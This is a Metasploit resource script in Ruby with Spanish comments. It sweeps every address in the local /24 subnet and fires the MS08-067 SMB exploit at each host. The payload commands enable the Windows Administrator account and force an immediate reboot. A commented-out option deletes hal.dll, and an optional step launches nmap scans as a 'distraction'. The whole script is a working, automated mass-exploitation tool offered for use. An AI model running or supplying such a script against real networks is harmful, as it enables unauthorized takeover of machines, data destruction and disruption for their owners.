<ruby>
$start = Time.now

$exc = [110, 120, 130] 	# IPs a excluir
$boo = 0 				# Distraccion con NMAP (si:1 / no:0)

$rip = 1 				# IP Inicial
$fin = 254 				# IP Final

$trg = 0				# Defincion del target. 0 para Automatico

$cmd = []
# Definicion de comandos a ejecutar en Windows. 
# Pueden añadir los que consideren necesarios
$cmd << "net user Administrator /active:yes"
$cmd << "shutdown -r -t 0"
# "net user Administrator /active:no"
# "shutdown -r -t 0"
# "del hal.dll"

print_status("----------------------------")
print_status("--         INICIO         --")
print_status("----------------------------")

print_status("--> Obtiene IP local y halla segmento")
require 'socket'
require 'resolv-replace'
ip = Socket.ip_address_list.detect{|intf| intf.ipv4_private?}
	$lip = ip.ip_address							# IP local
	$seg = ip.ip_address.rpartition(".")[0] + "."	# Segmento de red
	print_status("IP Local: #{$lip}")
	print_status("Segmento: #{$seg}")

run_single("service postgresql start")
run_single("service metasploit start")
run_single("msfdb init")

print_status("--> Ataque con ms08_067_netapi")
run_single("use exploit/windows/smb/ms08_067_netapi")

print_status("--> Seteo de Payload y de opciones")
run_single("set payload windows/exec")

while $fin >= $rip
	unless $exc.include?($rip)
		print_status("----------------------------")
		print_status("--         ATAQUE         --")
		print_status("----------------------------")
		 
		print_status("--> IP Remota: #{$seg}#{$rip}")
		print_status("--> Adicion de host y seteo de rhost")
		run_single("set rhost #{$seg}#{$rip}")
		 
		if $boo == 1
			print_status("--> Distraccion")
			run_single("gnome-terminal -x sh -c 'nmap -T4 -A -v #{$seg}#{$rip}; exit; exec bash'")
			run_single("gnome-terminal -x sh -c 'nmap -sS -sU -T4 -A -v #{$seg}#{$rip}; exit; exec bash'")
			run_single("gnome-terminal -x sh -c 'nmap -sn #{$seg}#{$rip}; exit; exec bash'")
			run_single("gnome-terminal -x sh -c 'nmap #{$seg}#{$rip}; exit; exec bash'")
		end
		 
		print_status("--> Ataque")
		$cmd.each do |command|
			run_single("set cmd #{command}")
			if $trg == 0
				run_single("exploit")
			else
				run_single("exploit -t #{$trg}")
			end
		end
		 
	else
		print_status("---------- EXCLUYE ---------")
		print_status("--> IP Remota: #{$seg}#{$rip}")
	end
	$rip += 1
end

$finish = Time.now
$diff = $finish - $start

print_status("----------------------------")
print_status("--         FINAL          --")
print_status("----------------------------")
print_status("Tiempo de ejecucion: #{$diff} segundos.")

</ruby>
